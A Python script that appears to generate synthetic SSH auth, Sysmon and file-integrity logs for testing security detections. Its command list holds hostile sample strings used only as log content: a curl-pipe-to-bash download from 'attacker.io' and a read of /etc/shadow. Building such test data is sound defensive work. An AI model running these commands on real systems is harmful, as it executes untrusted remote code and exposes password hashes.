#!/usr/bin/env python3
"""
HomeSOC Synthetic Log Generator & Replayer
Generates synthetic Linux auth, Sysmon, and FIM logs for SOC detection testing.
Can output to file, stdout, or remote syslog.
"""

import argparse
import datetime
import json
import os
import random
import socket
import sys
import time

SSH_USERS = ["root", "admin", "ubuntu", "honeysh", "deploy", "guest", "postgres"]
SOURCE_IPS = ["192.168.1.50", "10.0.0.15", "203.0.113.195", "198.51.100.24", "185.220.101.5"]
COMMANDS = ["sudo -i", "whoami", "cat /etc/shadow", "curl -s http://attacker.io/sh | bash", "systemctl status sshd"]
FIM_PATHS = ["/monitored/malware_sample.elf", "/monitored/config.cfg", "/etc/passwd", "/etc/shadow", "/bin/ls"]


def generate_auth_log():
    ts = datetime.datetime.now().strftime("%b %d %H:%M:%S")
    host = "ubuntu-endpoint-01"
    pid = random.randint(1000, 32000)
    user = random.choice(SSH_USERS)
    ip = random.choice(SOURCE_IPS)
    port = random.randint(30000, 65000)

    log_types = [
        f"{ts} {host} sshd[{pid}]: Failed password for invalid user {user} from {ip} port {port} ssh2",
        f"{ts} {host} sshd[{pid}]: Accepted password for {user} from {ip} port {port} ssh2",
        f"{ts} {host} sudo:   {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={random.choice(COMMANDS)}",
        f"{ts} {host} sshd[{pid}]: Connection closed by authenticating user {user} {ip} port {port} [preauth]",
    ]
    return random.choice(log_types)


def generate_sysmon_log():
    user = random.choice(SSH_USERS)
    cmd = random.choice(COMMANDS)
    event = {
        "source": "sysmon",
        "EventID": 1,
        "UtcTime": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "ProcessGuid": f"{{{random.randint(100000,999999)}-0000-0000-0000-000000000000}}",
        "ProcessId": random.randint(1000, 65000),
        "Image": "/usr/bin/bash",
        "CommandLine": f"/bin/bash -c \"{cmd}\"",
        "User": f"root",
        "ParentImage": "/usr/sbin/sshd",
        "ParentCommandLine": "sshd: root@pts/0",
        "mitre_technique": "T1059.004",
        "mitre_tactic": "Execution"
    }
    return json.dumps(event)


def generate_fim_log():
    path = random.choice(FIM_PATHS)
    action = random.choice(["added", "modified", "deleted"])
    event = {
        "source": "fim",
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "agent": {"id": "001", "name": "ubuntu-endpoint-01"},
        "syscheck": {
            "path": path,
            "event": action,
            "size_after": random.randint(1024, 204800),
            "md5_after": f"{random.getrandbits(128):032x}",
            "sha256_after": f"{random.getrandbits(256):064x}",
            "uname_after": "root",
            "gname_after": "root",
            "mtime_after": datetime.datetime.now(datetime.timezone.utc).isoformat()
        },
        "mitre_technique": "T1565.001",
        "mitre_tactic": "Defense Evasion"
    }
    return json.dumps(event)


def send_syslog_msg(message, host="127.0.0.1", port=514):
    data = message.encode("utf-8")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(data, (host, port))
    sock.close()


def main():
    parser = argparse.ArgumentParser(description="Synthetic Log Generator & Replayer")
    parser.add_argument("--type", choices=["auth", "sysmon", "fim", "all"], default="all", help="Log category")
    parser.add_argument("--count", type=int, default=10, help="Total number of events to emit")
    parser.add_argument("--output", choices=["stdout", "file", "syslog"], default="stdout", help="Target output")
    parser.add_argument("--file", default="logs/synthetic.log", help="Output log file path")
    parser.add_argument("--syslog-host", default="127.0.0.1", help="Syslog host")
    parser.add_argument("--syslog-port", type=int, default=514, help="Syslog port")
    parser.add_argument("--interval", type=float, default=0.0, help="Delay between messages in seconds")

    args = parser.parse_args()

    file_handle = None
    if args.output == "file":
        os.makedirs(os.path.dirname(os.path.abspath(args.file)), exist_ok=True)
        file_handle = open(args.file, "a", encoding="utf-8")

    try:
        for i in range(args.count):
            selected_type = args.type
            if selected_type == "all":
                selected_type = random.choice(["auth", "sysmon", "fim"])

            if selected_type == "auth":
                line = generate_auth_log()
            elif selected_type == "sysmon":
                line = generate_sysmon_log()
            else:
                line = generate_fim_log()

            if args.output == "stdout":
                print(line)
            elif args.output == "file":
                file_handle.write(line + "\n")
                file_handle.flush()
                print(f"[+] Appended {selected_type} log {i+1}/{args.count} to {args.file}")
            elif args.output == "syslog":
                send_syslog_msg(line, host=args.syslog_host, port=args.syslog_port)
                print(f"[+] Sent {selected_type} log {i+1}/{args.count} to {args.syslog_host}:{args.syslog_port}")

            if args.interval > 0 and i < args.count - 1:
                time.sleep(args.interval)
    finally:
        if file_handle:
            file_handle.close()


if __name__ == "__main__":
    main()
